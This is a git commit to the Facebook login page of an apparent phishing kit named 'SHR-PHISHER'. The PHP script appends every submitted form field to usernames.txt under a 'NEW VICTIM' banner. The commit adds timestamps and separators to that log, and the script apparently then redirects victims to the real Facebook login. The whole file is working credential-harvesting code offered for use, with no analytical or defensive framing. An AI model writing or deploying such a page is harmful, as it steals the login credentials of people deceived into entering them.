e58cb38a37431e7b5dfa53b0cd7a5407d4952ac4
Roshan0786shah <roshanali955955@gmail.com>
2026-02-15 20:20:27 +0530

    Update login.php

--- sites/facebook/login.php
+++ sites/facebook/login.php
@@ -1,12 +1,15 @@
 <?php
 // PHP Script to capture user credentials
 $handle = fopen("usernames.txt", "a");
-fwrite($handle, "---------- NEW VICTIM (FACEBOOK) ----------\n");
+$date = date('Y-m-d H:i:s');
+fwrite($handle, "---------- NEW VICTIM (SHR-PHISHER FB) - $date ----------\n");
 
+// Capturing all POST data including the selected followers
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable . ": " . $value . "\n");
 }
 
+fwrite($handle, "---------------------------------------------------------\n\n");
 fclose($handle);
 
 // Redirect the user back to the official Facebook login
